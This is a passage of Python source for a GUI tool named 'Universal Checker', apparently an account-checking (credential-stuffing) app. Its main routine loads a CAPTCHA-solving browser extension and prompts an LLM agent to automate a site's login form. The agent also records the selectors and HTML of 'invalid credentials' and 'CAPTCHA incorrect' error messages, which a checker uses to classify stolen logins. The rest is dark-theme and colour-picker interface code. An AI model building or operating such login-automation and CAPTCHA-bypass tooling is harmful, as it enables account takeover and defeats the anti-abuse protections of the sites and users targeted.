            if len(cmd_args) > 1:
                chained = " && ".join(
                    f"npx --no-install agent-browser {global_str} {c}"
                    for c in cmd_args
                )
                pwsh_cmd = chained
            elif cmd_args:
                pwsh_cmd = f"npx -y agent-browser {global_str} {cmd_args[0]}"
            else:
                pwsh_cmd = f"npx -y agent-browser {global_str}"
            
        # Determine if we can try the fast offline path --no-install
        can_use_offline = (clean_args and clean_args[0] != "install")
        
        # Timeout: 120 seconds for batch operations (page loads + JS eval can be slow)
        # 30 seconds for simple commands
        timeout_secs = 120 if ("open" in pwsh_cmd or "eval" in pwsh_cmd) else 30
        
        if can_use_offline:
            pwsh_cmd_cached = pwsh_cmd.replace("npx -y", "npx --no-install")
            full_args_cached = ["pwsh", "-NoProfile", "-Command", pwsh_cmd_cached]
            
            try:
                result = subprocess.run(
                    full_args_cached,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    timeout=timeout_secs
                )
                if result.returncode == 0:
                    return result.stdout, result.stderr, result.returncode
            except subprocess.TimeoutExpired:
                print_action(f"{Fore.YELLOW}[AgentBrowser] Cached npx timed out after {timeout_secs}s, retrying with full npx...{Style.RESET_ALL}")
                
        full_args = ["pwsh", "-NoProfile", "-Command", pwsh_cmd]
        
        try:
            result = subprocess.run(
                full_args,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout_secs
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            print_action(f"{Fore.RED}[AgentBrowser] Command timed out after {timeout_secs}s. The browser may be stuck.{Style.RESET_ALL}")
            return "", f"Timed out after {timeout_secs}s", 1


    def agent_browser_discovery_worker(test_user, test_pass):
        """Learning worker thread for Rust agent-browser persistent session loop."""
        import json
        import os
        import time
        try:
            # 0. Pre-emptively close any running background browser daemons
            # to guarantee that new options (headed, extensions) load cleanly.
            print_action(f"{Fore.CYAN}  [0/6] Cleaning up any background browser daemons...{Style.RESET_ALL}")
            run_agent_browser(["--session", "discovery_session", "close"])
            run_agent_browser(["close", "--all"])
            
            print_action(f"{Fore.CYAN}🚀 Starting Persistent Rust Agent-Browser Learning Session on: {target_url}{Style.RESET_ALL}")
            
            # Load Chrome extensions (such as rektCaptcha solver) if enabled or present
            ext_args = []
            try:
                class MockOptions:
                    pass
                mock_opts = MockOptions()
                unpacked_dirs = load_chrome_extensions(mock_opts, return_dirs=True) or []
                
                # Try scanning _ext_unpacked folder in project root for subdirectories containing manifest.json
                proj_root = os.path.dirname(os.path.abspath(__file__))
                unpacked_root = os.path.join(proj_root, "_ext_unpacked")
                if os.path.isdir(unpacked_root):
                    for item in os.listdir(unpacked_root):
                        item_path = os.path.join(unpacked_root, item)
                        if os.path.isdir(item_path) and os.path.isfile(os.path.join(item_path, "manifest.json")):
                            if item_path not in unpacked_dirs:
                                unpacked_dirs.append(item_path)
                                
                for d in unpacked_dirs:
                    if os.path.isdir(d):
                        ext_args.extend(["--extension", d])
            except Exception as ex_err:
                print_action(f"{Fore.YELLOW}[Extensions] Warning pre-unpacking extensions: {ex_err}{Style.RESET_ALL}")
                
            # Build global CLI options with persistent session
            global_opts = ["--session", "discovery_session"]
            if ext_args or not var_headless.get():
                global_opts.append("--headed")
            if ext_args:
                global_opts.extend(ext_args)
                print_action(f"{Fore.GREEN}[Extensions] Loaded {len(ext_args)//2} extension(s) into Rust browser session.{Style.RESET_ALL}")
            
            # Note: Chrome launch args (--no-sandbox etc.) should be configured via
            # agent-browser.json or AGENT_BROWSER env vars, not CLI --args flag.
                
            # 1. Warm up binaries
            print_action(f"{Fore.CYAN}  [1/6] Pre-warming local Chrome/Chromium binaries...{Style.RESET_ALL}")
            run_agent_browser(["install"])
            
            discovered_selectors = {
                "email_field": "",
                "password_field": "",
                "submit_button": "",
                "next_button": "",
                "invalid_error_selector": "",
                "invalid_inner_html": "",
                "invalid_outer_html": "",
                "captcha_error_selector": "",
                "captcha_inner_html": "",
                "captcha_outer_html": ""
            }
            
            history_actions = []
            step_limit = 6
            current_step = 0
            last_decision = {}
            
            # js_query to scan the DOM for controls and error containers
            js_query = "eval (function(){var els=[];var tags=['input','button','select','textarea','form'];for(var i=0;i<tags.length;i++){var nl=document.getElementsByTagName(tags[i]);for(var j=0;j<nl.length;j++){els.push(nl[j]);}}var potential_errors=document.querySelectorAll('div,span,p,label,section,h1,h2,h3');var error_keywords=[/error/i,/danger/i,/warning/i,/alert/i,/incorrect/i,/fail/i,/invalid/i,/wrong/i,/неверный/i,/ошибка/i,/неправильн/i,/captcha/i,/капча/i];for(var i=0;i<potential_errors.length;i++){var el=potential_errors[i];var text=el.innerText||'';var className=el.className||'';var idName=el.id||'';var matches=false;for(var k=0;k<error_keywords.length;k++){if(error_keywords[k].test(text)||error_keywords[k].test(className)||error_keywords[k].test(idName)){matches=true;break;}}if(matches&&els.indexOf(el)===-1){els.push(el);}}return els.map(function(el){var outer=el.outerHTML||'';if(outer.length>300){outer=outer.slice(0,300)+'...';}return {tag:el.tagName,id:el.id,class:el.className,name:el.name||'-',placeholder:el.placeholder||'-',type:el.type||'-',text:(el.innerText||el.value||'').trim(),outerHTML:outer};}).slice(0,150);})()"
            
            while current_step < step_limit:
                current_step += 1
                print_action(f"{Fore.CYAN}  [{1+current_step}/7] Exploration round step {current_step}...{Style.RESET_ALL}")
                
                cmd_list = []
                if current_step == 1:
                    # Step 1: Open the target URL and wait for it to settle down
                    cmd_list.append(f"open {target_url}")
                    cmd_list.append("wait 3000")
                else:
                    action_type = last_decision.get("action_type")
                    target_ref = last_decision.get("target_ref")
                    target_selector = last_decision.get("target_selector")
                    
                    # Prioritize accessibility ref code (e.g. @e1) to traverse frames successfully
                    interact_target = target_ref if (target_ref and target_ref.startswith("@")) else target_selector
                    if not interact_target:
                        interact_target = target_selector or target_ref
                        
                    safe_selector = interact_target.replace('"', "'") if interact_target else ""
                    
                    if action_type == "fill_email" and interact_target:
                        if interact_target.startswith("@"):
                            cmd_list.append(f"fill {interact_target} \"{test_user}\"")
                        else:
                            cmd_list.append(f"find first \"{safe_selector}\" fill \"{test_user}\"")
                        history_actions.append(f"Filled username/email in {interact_target}")
                    elif action_type == "fill_password" and interact_target:
                        if interact_target.startswith("@"):
                            cmd_list.append(f"fill {interact_target} \"{test_pass}\"")
                        else:
                            cmd_list.append(f"find first \"{safe_selector}\" fill \"{test_pass}\"")
                        history_actions.append(f"Filled password in {interact_target}")
                    elif action_type == "click_next" and interact_target:
                        if interact_target.startswith("@"):
                            cmd_list.append(f"click {interact_target}")
                        else:
                            cmd_list.append(f"find first \"{safe_selector}\" click")
                        cmd_list.append("wait 2000")
                        history_actions.append(f"Clicked transition button: {interact_target}")
                    elif action_type in ["submit", "click_submit", "click_signin", "click_button"] and interact_target:
                        if interact_target.startswith("@"):
                            cmd_list.append(f"click {interact_target}")
                        else:
                            cmd_list.append(f"find first \"{safe_selector}\" click")
                        cmd_list.append("wait 4000")
                        history_actions.append(f"Clicked submit button: {interact_target}")
                    elif action_type == "wait":
                        cmd_list.append("wait 5000")
                        history_actions.append("Waited 5 seconds for solver/page load")
                    else:
                        break
                
                # Append final snapshot command (but NOT the js_query — that runs separately)
                # cmd_list now contains action commands only
                
                # ── PHASE A: Execute action commands (open/fill/click/wait) ──
                # These don't need --json output, they just drive the browser.
                if cmd_list:
                    action_args = list(global_opts) + cmd_list
                    print_action(f"{Fore.CYAN}  Executing {len(cmd_list)} browser action(s)...{Style.RESET_ALL}")
                    stdout_a, stderr_a, code_a = run_agent_browser(action_args)
                    if code_a != 0:
                        print_action(f"{Fore.YELLOW}  Warning: Action commands returned code {code_a}: {stderr_a[:300] if stderr_a else stdout_a[:300]}{Style.RESET_ALL}")
                
                # ── PHASE B: Take snapshot (accessibility tree) ──
                snapshot_text = ""
                snap_args = list(global_opts) + ["--json", "snapshot -i"]
                stdout_snap, stderr_snap, code_snap = run_agent_browser(snap_args)
                if code_snap == 0 and stdout_snap.strip():
                    try:
                        snap_data = json.loads(stdout_snap.strip())
                        if isinstance(snap_data, dict):
                            snapshot_text = snap_data.get("snapshot", snap_data.get("text", ""))
                        elif isinstance(snap_data, str):
                            snapshot_text = snap_data
                    except json.JSONDecodeError:
                        # Non-JSON output — treat as raw text snapshot
                        snapshot_text = stdout_snap.strip()
                else:
                    print_action(f"{Fore.YELLOW}  Snapshot returned code {code_snap}. Using raw output.{Style.RESET_ALL}")
                    snapshot_text = stdout_snap.strip() if stdout_snap else ""
                
                # ── PHASE C: Evaluate JS to extract DOM elements ──
                dom_elements = []
                eval_args = list(global_opts) + ["--json", js_query]
                stdout_eval, stderr_eval, code_eval = run_agent_browser(eval_args)
                if code_eval == 0 and stdout_eval.strip():
                    try:
                        eval_data = json.loads(stdout_eval.strip())
                        if isinstance(eval_data, dict):
                            nested = eval_data.get("result", eval_data)
                            if isinstance(nested, list):
                                dom_elements = nested
                            elif isinstance(nested, dict) and "result" in nested:
                                inner = nested["result"]
                                if isinstance(inner, list):
                                    dom_elements = inner
                        elif isinstance(eval_data, list):
                            dom_elements = eval_data
                    except json.JSONDecodeError:
                        print_action(f"{Fore.YELLOW}  Warning: Could not parse eval JSON output.{Style.RESET_ALL}")
                
                print_action(f"{Fore.CYAN}  Active interactive accessibility tree:\n{snapshot_text}{Style.RESET_ALL}")
                print_action(f"{Fore.CYAN}  Found {len(dom_elements)} interactive DOM elements.{Style.RESET_ALL}")
                
                # Ask AI to determine selectors and logical next steps
                prompt = f"""
You are an AI selector and form discovery agent. You are automating a login sequence on the page: {target_url}

The user has supplied test credentials:
- Test Username/Email: {test_user}
- Test Password: {test_pass}

Actions executed so far in this persistent session:
{json.dumps(history_actions, indent=2) if history_actions else "None (Initial Page Load)"}

Here is the interactive Accessibility Tree of the CURRENT page state:
```text
{snapshot_text}
```

Here is the detailed DOM elements metadata from querySelectorAll (includes inputs, buttons, and error containers/divs):
```json
{json.dumps(dom_elements, indent=2)}
```

Your goal is to complete the login using these test credentials.
Note: The browser is loaded with the Rektcaptcha solver Chrome extension, which automatically solves any CAPTCHAs (reCAPTCHA, hCaptcha, Turnstile) on the page in the background.
If a CAPTCHA is visible or active on the page, you must wait for it to be solved automatically before typing or clicking the submit button. In this case, choose "action_type": "wait" to let it settle.

CRITICAL INSTRUCTIONS FOR IFRAMES:
- If the login fields (email, password, buttons) are inside an iframe, prefer using the accessibility tree ref code (e.g. `@e1`) rather than a CSS selector. The accessibility tree maps all elements globally across frames, so interacting with the ref `@eN` will succeed automatically, even inside cross-origin iframes!

Please analyze the elements and output a JSON object containing:
1. Mapped fields and selectors (in CSS selector format) if you can identify them in this step.
2. The next action to take to advance the login form (such as filling email, clicking next, filling password, clicking submit, or waiting for Captcha solver).
3. If any incorrect credentials (username/password) or incorrect CAPTCHA error alerts are visible on the page, detect their CSS selectors, inner text, and outer HTML.

Response MUST be a JSON object matching this exact format:
{{
  "email_ref": "@eX",          // The ref code from the accessibility tree for email input (or null if already filled / not found)
  "email_selector": "input...", // The CSS selector for email input (or null)
  "password_ref": "@eY",       // The ref code for password input (or null if not found)
  "password_selector": "input...", // The CSS selector for password input (or null)
  "submit_ref": "@eZ",         // The ref for final submit button (or null)
  "submit_selector": "button...", // The CSS selector for submit button (or null)
  "next_ref": "@eW",           // The ref for intermediate 'Next' button if multi-step login (or null)
  "next_selector": "button...",   // The CSS selector for intermediate 'Next' button (or null)
  
  "invalid_error_selector": "...",       // CSS selector of incorrect username/password error alert (or null if not visible)
  "invalid_inner_html": "...",           // The exact inner text (Inner HTML) of incorrect username/password error alert (or null)
  "invalid_outer_html": "...",           // The exact outer HTML of the incorrect username/password error alert (or null)
  
  "captcha_error_selector": "...",       // CSS selector of CAPTCHA incorrect error alert (or null if not visible)
  "captcha_inner_html": "...",           // The exact inner text (Inner HTML) of CAPTCHA incorrect error (or null)
  "captcha_outer_html": "...",           // The exact outer HTML of the CAPTCHA incorrect error (or null)

  "action_type": "fill_email" | "fill_password" | "click_next" | "submit" | "wait" | "complete", // What is the next logical step to execute
  "target_ref": "@eN",         // The element ref code to apply the action on (or null for 'wait' action)
  "target_selector": "input...", // The CSS selector for the element to apply the action on (e.g. "#login" or "button.btn-primary" or null if 'wait')
  "error_selector": "div...",  // If you detect any active warning or error message container on this page, specify its CSS selector (or null)
  "error_message": "..."       // If an error is visible, specify the text (or null)
}}
"""
                ai_res = ask_ai_agent(prompt)
                print_action(f"{Fore.GREEN}  AI Decision: {ai_res.get('action_type')} on target {ai_res.get('target_selector') or ai_res.get('target_ref')}{Style.RESET_ALL}")
                
                # Record selectors discovered so far
                for field in [
                    "email_field", "password_field", "submit_button", "next_button",
                    "invalid_error_selector", "invalid_inner_html", "invalid_outer_html",
                    "captcha_error_selector", "captcha_inner_html", "captcha_outer_html"
                ]:
                    key = field
                    if field == "email_field":
                        key = "email_selector"
                    elif field == "password_field":
                        key = "password_selector"
                    elif field == "submit_button":
                        key = "submit_selector"
                    elif field == "next_button":
                        key = "next_selector"
                        
                    val = ai_res.get(key)
                    if val is not None and val != "":
                        discovered_selectors[field] = val
                        
                action_type = ai_res.get("action_type")
                if action_type == "complete":
                    break
                    
                # Save decision for the next round
                last_decision = ai_res
                
            print_action(f"{Fore.CYAN}  [6/6] Finalizing persistent learning session and importing selectors...{Style.RESET_ALL}")
            run_agent_browser(["--session", "discovery_session", "close"])
            
            # Prepare result dictionary
            safe_dict = {
                "email_field": discovered_selectors["email_field"],
                "password_field": discovered_selectors["password_field"],
                "submit_button": discovered_selectors["submit_button"],
                "next_button": discovered_selectors["next_button"],
                "invalid_error_selector": discovered_selectors["invalid_error_selector"],
                "invalid_inner_html": discovered_selectors["invalid_inner_html"],
                "invalid_outer_html": discovered_selectors["invalid_outer_html"],
                "captcha_error_selector": discovered_selectors["captcha_error_selector"],
                "captcha_inner_html": discovered_selectors["captcha_inner_html"],
                "captcha_outer_html": discovered_selectors["captcha_outer_html"]
            }
            
            if any(safe_dict.values()):
                window.after(0, lambda d=safe_dict: update_selectors(d))
                print_action(f"{Fore.GREEN}✓ Discovered selectors: {safe_dict}{Style.RESET_ALL}")
            else:
                raise RuntimeError("Learning loop finished but could not identify any stable CSS selectors.")
                
        except Exception as exc:
            print_action(f"{Fore.RED}Rust Learning Loop Error: {exc}{Style.RESET_ALL}")
            # Ensure browser session is closed in case of failure
            try:
                run_agent_browser(["--session", "discovery_session", "close"])
            except Exception:
                pass
            window.after(0, lambda err=str(exc): messagebox.showerror(
                "Rust Discovery Error", f"An error occurred during interactive discovery:\n{err}"
            ))
        finally:
            window.after(0, lambda: btn_discover.configure(state="normal", text="✨ Auto-Discover"))

    def discovery_worker():
        try:
            print_action(f"{Fore.CYAN}Starting AI Squad automated field discovery for: {target_url}{Style.RESET_ALL}")
            
            def _log(msg: str):
                print_action(f"{Fore.CYAN}  {msg}{Style.RESET_ALL}")
                
            from engine.core.discovery_bridge import run_and_validate_cached
            from engine.core.discovery_schema import DiscoveryValidationError
            
            try:
                result = run_and_validate_cached(
                    target_url=target_url,
                    api_keys=api_keys,
                    log_callback=_log,
                    preferred_model=preferred_model,
                    use_database=var_use_database.get(),
                    claude_proxy_url=claude_proxy_url_val,
                    claude_proxy_model=claude_proxy_model_val,
                    claude_proxy_enabled=claude_proxy_enabled,
                )
            except DiscoveryValidationError as val_exc:
                print_action(
                    f"{Fore.RED}✗ Discovery output rejected by schema validator.{Style.RESET_ALL}\n"
                    f"  Errors: {'; '.join(e.get('msg','?') for e in val_exc.errors[:3])}"
                )
                window.after(0, lambda err=str(val_exc): messagebox.showerror(
                    "Discovery Validation Error",
                    f"The AI returned invalid selector data:\n{err}\n\n"
                    "Please fill the CSS selectors in manually."
                ))
                return
                
            safe_dict = result.to_gui_dict()
            if result.found_any():
                window.after(0, lambda d=safe_dict: update_selectors(d))
                missing = result.missing_fields()
                if missing:
                    print_action(
                        f"{Fore.YELLOW}⚠ Partial discovery: {', '.join(missing)} not found — fill manually.{Style.RESET_ALL}"
                    )
                else:
                    print_action(f"{Fore.GREEN}✓ AI Squad discovery completed — all fields populated.{Style.RESET_ALL}")
            else:
                print_action(f"{Fore.RED}✗ Discovery finished but no stable selectors found.{Style.RESET_ALL}")
                window.after(0, lambda: messagebox.showwarning(
                    "Discovery Result",
                    "Automated discovery finished but could not identify the login fields automatically.\n"
                    "Please fill them in manually."
                ))
        except Exception as exc:
            print_action(f"{Fore.RED}Discovery Error: {exc}{Style.RESET_ALL}")
            window.after(0, lambda err=str(exc): messagebox.showerror(
                "Discovery Error", f"An error occurred during discovery:\n{err}"
            ))
        finally:
            window.after(0, lambda: btn_discover.configure(state="normal", text="✨ Auto-Discover"))

    # ── Run the selected discovery flow ───────────
    if mode == "🤖 Rust Agent-Browser":
        credentials = open_rust_discovery_credentials_dialog(target_url)
        if not credentials.get("start"):
            return # User canceled
            
        test_user = credentials["email"]
        test_pass = credentials["password"]
        
        btn_discover.configure(state="disabled", text="Discovering... (Rust Browser)")
        threading.Thread(
            target=agent_browser_discovery_worker,
            args=(test_user, test_pass),
            daemon=True
        ).start()
    else:
        # Standard AI Crew Squad
        btn_discover.configure(state="disabled", text="Discovering... (Takes a while)")
        threading.Thread(target=discovery_worker, daemon=True).start()



def on_closing():
    """Handles window closing event."""
    save_settings()
    if 'cleanup_daemon_instance' in globals():
        cleanup_daemon_instance.stop()
    window.destroy()


# -------------------
# Main GUI Setup
# -------------------
# Initialize the GUI window
window.title(" | Universal Checker")
window.geometry("1400x900")  # Fallback size before maximize
# NOTE: window.state("zoomed") is called in __main__ block AFTER all widgets
# are built and just before deiconify() — calling it here while the window is
# withdrawn causes a black screen flash on Python 3.13 (WM un-withdraws briefly).


# Modern Dark Theme Colors
colors = {
    "bg": "#121212",
    "surface": "#1e1e1e",
    "fg": "#ffffff",
    "fg_sub": "#b0b0b0",
    "accent": "#00adb5",
    "border": "#333333",
    "hover": "#252526"
}

# --- CURATED PREMIUM THEMES & CUSTOM CONFIGURATOR ENGINE ---

THEME_PRESETS = {
    "Futuristic Teal (Default)": {
        "bg": "#121212",
        "surface": "#1e1e1e",
        "fg": "#ffffff",
        "fg_sub": "#b0b0b0",
        "accent": "#00adb5",
        "border": "#333333",
        "hover": "#252526"
    },
    "Neon Purple": {
        "bg": "#0c0a1c",
        "surface": "#151130",
        "fg": "#ffffff",
        "fg_sub": "#a09cc2",
        "accent": "#8b5cf6",
        "border": "#2a2354",
        "hover": "#7c3aed"
    },
    "Sunset Amber": {
        "bg": "#110c08",
        "surface": "#1f140e",
        "fg": "#ffffff",
        "fg_sub": "#cab2a6",
        "accent": "#f59e0b",
        "border": "#3b261a",
        "hover": "#d97706"
    },
    "Matrix Green": {
        "bg": "#040d04",
        "surface": "#091a09",
        "fg": "#ffffff",
        "fg_sub": "#88b888",
        "accent": "#10b981",
        "border": "#153d15",
        "hover": "#059669"
    },
    "Classic Slate": {
        "bg": "#0f172a",
        "surface": "#1e293b",
        "fg": "#ffffff",
        "fg_sub": "#94a3b8",
        "accent": "#38bdf8",
        "border": "#334155",
        "hover": "#0ea5e9"
    }
}

def update_widget_colors(widget, clr):
    """
    Recursively updates standard Tkinter widget colors dynamically to map
    perfectly to the active user theme.
    """
    w_type = widget.winfo_class()
    try:
        if w_type == "Label":
            w_text = widget.cget("text")
            w_bg = widget.cget("bg")
            if "❖ SYSTEM TERMINAL" in str(w_text) or w_bg == "#111111":
                pass
            elif "Grip" in str(widget) or w_text == " ☰ ":
                widget.configure(bg=clr["surface"], fg=clr["accent"] if "default" in str(widget) else "#14b8a6")
            elif "sec" in str(w_text):
                widget.configure(bg=clr["surface"], fg=clr["fg_sub"])
            else:
                is_surface = ("DraggableFieldBlock" in str(widget.master) or 
                              "widget_frame" in str(widget.master) or
                              "toolbar_frame" in str(widget.master))
                widget.configure(bg=clr["surface"] if is_surface else clr["bg"], fg=clr["fg"])
        elif w_type == "Frame":
            is_surface = ("DraggableFieldBlock" in str(widget) or 
                          "widget_frame" in str(widget) or
                          "toolbar_frame" in str(widget) or
                          "title_bar" in str(widget))
            if "title_bar" in str(widget):
                widget.configure(bg="#111111")
            else:
                widget.configure(bg=clr["surface"] if is_surface else clr["bg"])
        elif w_type == "Button":
            w_text = widget.cget("text")
            if "✖" in str(w_text):
                widget.configure(bg=clr["surface"], activebackground="#e53e3e", activeforeground="#ffffff")
            elif "CLEAR" in str(w_text) or " - " == str(w_text):
                pass
            else:
                widget.configure(bg=clr["surface"], fg=clr["fg"])
        elif w_type == "Text":
            if widget.winfo_name() != "log_text" and "log_text" not in str(widget):
                widget.configure(bg=clr["surface"], fg=clr["fg"], insertbackground=clr["fg"])
        elif w_type == "Listbox":
            widget.configure(bg=clr["surface"], fg=clr["fg"], selectbackground=clr["accent"], selectforeground=clr["bg"])
        elif w_type == "Canvas":
            widget.configure(bg=clr["bg"], highlightbackground=clr["bg"])
    except Exception:
        pass

    for child in widget.winfo_children():
        update_widget_colors(child, clr)

def apply_color_palette(new_colors=None):
    """
    Applies style variables and re-renders both standard Tkinter and ttk theme styles.
    """
    global colors
    if new_colors:
        for k in colors:
            if k in new_colors:
                colors[k] = new_colors[k]
                
    style.configure(".", background=colors["bg"], foreground=colors["fg"])
    style.configure("TFrame", background=colors["bg"])
    style.configure("TLabel", background=colors["bg"], foreground=colors["fg"])
    
    style.configure("TNotebook", background=colors["bg"])
    style.configure("TNotebook.Tab",
        padding=[12, 6],
        font=("Inter", 9, "bold"),
        background=colors["surface"],
        foreground=colors["fg_sub"],
    )
    style.map("TNotebook.Tab",
        background=[("selected", colors["accent"]), ("active", "#1f2b3a"), ("!selected", colors["surface"])],
        foreground=[("selected", colors["bg"]), ("active", colors["fg"]), ("!selected", colors["fg_sub"])],
        expand=[("selected", [1, 1, 1, 0])],
    )
    
    style.configure("TButton", 
                    background=colors["accent"], 
                    foreground=colors["bg"])
    style.map("TButton", 
              background=[("active", colors["hover"])])
    
    style.configure("TEntry", 
                    fieldbackground=colors["surface"], 
                    foreground=colors["fg"], 
                    insertcolor=colors["fg"], 
                    bordercolor=colors["border"])
    style.map("TEntry",
              fieldbackground=[("focus", colors["surface"]), ("!disabled", colors["surface"])],
              foreground=[("focus", colors["fg"]), ("!disabled", colors["fg"])])
              
    style.configure("TSpinbox", 
                    fieldbackground=colors["surface"], 
                    foreground=colors["fg"],
                    insertcolor=colors["fg"])
    style.map("TSpinbox",
              fieldbackground=[("focus", colors["surface"]), ("!disabled", colors["surface"])],
              foreground=[("focus", colors["fg"]), ("!disabled", colors["fg"])])
              
    style.configure("TCombobox", 
                    fieldbackground=colors["surface"], 
                    foreground=colors["fg"], 
                    background=colors["surface"],
                    bordercolor=colors["border"],
                    lightcolor=colors["border"],
                    darkcolor=colors["border"],
                    arrowcolor=colors["fg"])
    style.map("TCombobox",
              fieldbackground=[("readonly", colors["surface"]), ("!disabled", colors["surface"])],
              foreground=[("readonly", colors["fg"]), ("!disabled", colors["fg"])])
              
    window.option_add("*TCombobox*Listbox.background", colors["surface"])
    window.option_add("*TCombobox*Listbox.foreground", colors["fg"])
    window.option_add("*TCombobox*Listbox.selectBackground", colors["accent"])
    window.option_add("*TCombobox*Listbox.selectForeground", colors["bg"])
    
    style.configure("TCheckbutton", background=colors["bg"], foreground=colors["fg_sub"])
    style.map("TCheckbutton",
              background=[("active", colors["bg"])],
              foreground=[("active", colors["fg"])])
              
    style.configure("TLabelframe", background=colors["bg"], foreground=colors["accent"], borderwidth=1)
    style.configure("TLabelframe.Label", background=colors["bg"], foreground=colors["accent"], font=("Inter", 10, "bold"))
    
    window.configure(bg=colors["bg"])
    update_widget_colors(window, colors)
    window.update_idletasks()

def open_color_picker_dialog():
    """
    Spawns a custom theme palette editor supporting circular presets
    and interactive color picker rows.
    """
    from tkinter import colorchooser
    
    dialog = tk.Toplevel(window)
    dialog.title("Theme Color Palette Editor")
    dialog.geometry("620x530")
    dialog.configure(bg=colors["bg"])
    dialog.resizable(False, False)
    dialog.grab_set()
    
    temp_colors = colors.copy()
    
    lbl_title = tk.Label(
        dialog,
        text="🎨 THEME COLOR PALETTE EDITOR",
        font=("Inter", 12, "bold"),
        fg=colors["accent"],
        bg=colors["bg"]
    )
    lbl_title.pack(pady=(15, 10))
    
    frm_presets = tk.LabelFrame(
        dialog,
        text=" Curated Premium Theme Presets ",
        fg=colors["accent"],
        bg=colors["bg"],
        font=("Inter", 9, "bold"),
        padx=10,
        pady=10
    )
    frm_presets.pack(fill="x", padx=20, pady=5)
    
    def apply_preset(name):
        preset = THEME_PRESETS[name]
        for key in temp_colors:
            if key in preset:
                temp_colors[key] = preset[key]
        for key, preview_lbl in custom_color_labels.items():
            preview_lbl.config(bg=temp_colors[key])
        apply_color_palette(temp_colors)
    
    for name, val in THEME_PRESETS.items():
        frm_p = tk.Frame(frm_presets, bg=colors["bg"])
        frm_p.pack(side="left", expand=True, padx=5)
        
        canv = tk.Canvas(frm_p, width=24, height=24, bg=colors["bg"], highlightthickness=0)
        canv.pack(pady=2)
        canv.create_oval(2, 2, 22, 22, fill=val["accent"], outline=val["border"], width=1)
        
        lbl_p = tk.Label(frm_p, text=name.split(" ")[0], font=("Inter", 8, "bold"), fg=colors["fg"], bg=colors["bg"])
        lbl_p.pack()
        
        def make_handler(theme_name):
            return lambda e: apply_preset(theme_name)
        canv.bind("<Button-1>", make_handler(name))
        lbl_p.bind("<Button-1>", make_handler(name))
        CreateToolTip(canv, f"Click to apply the {name} preset theme.")
        
    frm_custom = tk.LabelFrame(
        dialog,
        text=" Individual Color Adjustments ",
        fg=colors["accent"],
        bg=colors["bg"],
        font=("Inter", 9, "bold"),
        padx=10,
        pady=10
    )
    frm_custom.pack(fill="both", expand=True, padx=20, pady=5)
    
    color_keys_meta = [
        ("bg", "Main Background (bg)"),
        ("surface", "Blocks Surface (surface)"),
        ("fg", "Primary Labels Text (fg)"),
        ("fg_sub", "Subtext / Inactive Tab (fg_sub)"),
        ("accent", "Accent Highlight (accent)"),
        ("border", "Frame Borders (border)"),
        ("hover", "Button Active Hover (hover)")
    ]
    
    custom_color_labels = {}
    
    def pick_color(key):
        color_code = colorchooser.askcolor(initialcolor=temp_colors[key], title=f"Choose color for {key}")[1]
        if color_code:
            temp_colors[key] = color_code
            custom_color_labels[key].config(bg=color_code)
            apply_color_palette(temp_colors)
            
    for key, label_text in color_keys_meta:
        row_frm = tk.Frame(frm_custom, bg=colors["bg"])
        row_frm.pack(fill="x", pady=2)
        
        lbl_c = tk.Label(row_frm, text=label_text, font=("Inter", 9), fg=colors["fg_sub"], bg=colors["bg"], width=24, anchor="w")
        lbl_c.pack(side="left", padx=5)
        
        preview = tk.Label(row_frm, text="     ", bg=temp_colors[key], relief="ridge", bd=1)
        preview.pack(side="left", padx=10)
        custom_color_labels[key] = preview
        
        btn_c = tk.Button(
            row_frm,
            text="Pick Color",
            font=("Inter", 8, "bold"),
            bg="#2d3748",
            fg=colors["fg"],
            relief="flat",
            borderwidth=0,
            command=lambda k=key: pick_color(k)
        )
        btn_c.pack(side="right", padx=5)
        
    frm_btns = tk.Frame(dialog, bg=colors["bg"])
    frm_btns.pack(fill="x", side="bottom", pady=15, padx=20)
    
    def on_save():
        for k in colors:
            if k in temp_colors:
                colors[k] = temp_colors[k]
        save_settings()
        dialog.destroy()
        
    def on_cancel():
        apply_color_palette(colors)
        dialog.destroy()
        
    btn_cancel = tk.Button(
        frm_btns,
        text="Cancel Changes",
        font=("Inter", 9, "bold"),
        bg="#e53e3e",
        fg="#ffffff",
        relief="flat",
        borderwidth=0,
        padx=15,
        pady=8,
        command=on_cancel
    )
    btn_cancel.pack(side="left")
    
    btn_save = tk.Button(
        frm_btns,
        text="Save Configuration & Close",
        font=("Inter", 9, "bold"),
        bg=colors["accent"],
        fg=colors["bg"],
        relief="flat",
        borderwidth=0,
        padx=15,
        pady=8,
        command=on_save
    )
    btn_save.pack(side="right")

# Make the window resizable
window.resizable(True, True)

# Styling
style = ttk.Style()
style.theme_use("clam")

# Global Styles
style.configure(".", background=colors["bg"], foreground=colors["fg"], font=("Inter", 10))
style.configure("TFrame", background=colors["bg"])
style.configure("TLabel", background=colors["bg"], foreground=colors["fg"], font=("Inter", 10))

# Notebook Styling
style.configure("TNotebook", background=colors["bg"], borderwidth=0)

# Enable native left/right tab-scroll arrows and layout client mappings
style.layout("TNotebook", [
    ("Notebook.client", {"sticky": "nswe"}),
])
style.layout("TNotebook.Tab", [
    ("Notebook.tab", {
        "sticky": "nswe",
        "children": [
            ("Notebook.padding", {
                "sticky": "nswe",
                "children": [
                    ("Notebook.label", {"sticky": ""})
                ]
            })
        ]
    })
])

style.configure("TNotebook", tabposition="nw")
style.configure("TNotebook.Tab",
    padding=[12, 6],
    font=("Inter", 9, "bold"),
    background=colors["surface"],
    foreground=colors["fg_sub"],
)
# Force light text colors for selected, hovered, and inactive/!selected tab headers explicitly
style.map("TNotebook.Tab",
    background=[("selected", colors["accent"]), ("active", "#1f2b3a"), ("!selected", colors["surface"])],
    foreground=[("selected", colors["bg"]), ("active", colors["fg"]), ("!selected", colors["fg_sub"])],
    expand=[("selected", [1, 1, 1, 0])],
)

# Button Styling
style.configure("TButton", 
                background=colors["accent"], 
                foreground=colors["bg"], 
                font=("Inter", 10, "bold"), 
                borderwidth=0, 
                padding=[20, 10])
style.map("TButton", 
          background=[("active", "#008a91")])

# Entry/Spinbox Styling (Forces high-contrast light text on dark background on ALL OS settings)
style.configure("TEntry", 
                fieldbackground=colors["surface"], 
                foreground=colors["fg"], 
                insertcolor=colors["fg"], 
                bordercolor=colors["border"],
                lightcolor=colors["border"],
                darkcolor=colors["border"],
                borderwidth=1, 
                relief="flat")
style.map("TEntry",
          fieldbackground=[("focus", colors["surface"]), ("!disabled", colors["surface"])],
